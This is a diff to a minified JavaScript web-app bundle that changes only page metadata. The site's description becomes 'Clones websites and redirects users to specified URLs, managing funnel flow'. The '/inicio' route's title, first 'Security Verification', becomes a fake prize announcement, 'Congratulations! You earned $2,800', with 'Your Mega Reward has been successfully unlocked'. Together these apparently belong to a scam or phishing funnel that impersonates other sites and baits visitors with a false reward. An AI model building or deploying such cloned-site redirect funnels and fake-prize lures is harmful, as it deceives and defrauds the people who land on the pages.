@@ -32668,13 +32668,13 @@ var Xg = Oc()({
       { title: `Digital System` },
       {
         name: `description`,
-        content: `Secure digital verification services.`,
+        content: `Clones websites and redirects users to specified URLs, managing funnel flow.`,
       },
       { name: `author`, content: `Lovable` },
       { property: `og:title`, content: `Digital System` },
       {
         property: `og:description`,
-        content: `Secure digital verification services.`,
+        content: `Clones websites and redirects users to specified URLs, managing funnel flow.`,
       },
       { property: `og:type`, content: `website` },
       { name: `twitter:card`, content: `summary_large_image` },
@@ -32682,7 +32682,7 @@ var Xg = Oc()({
       { name: `twitter:title`, content: `Digital System` },
       {
         name: `twitter:description`,
-        content: `Secure digital verification services.`,
+        content: `Clones websites and redirects users to specified URLs, managing funnel flow.`,
       },
       {
         property: `og:image`,
@@ -32878,15 +32878,15 @@ var $g = `modulepreload`,
   o_ = jc(`/inicio`)({
     head: () => ({
       meta: [
-        { title: `Security Verification` },
+        { title: `Congratulations! You earned $2,800` },
         {
           name: `description`,
-          content: `Your Digital Reward has been successfully unlocked.`,
+          content: `Your Mega Reward has been successfully unlocked.`,
         },
-        { property: `og:title`, content: `Security Verification` },
+        { property: `og:title`, content: `Congratulations! You earned $2,800` },
         {
           property: `og:description`,
-          content: `Your Digital Reward has been successfully unlocked.`,
+          content: `Your Mega Reward has been successfully unlocked.`,
         },
       ],
     }),
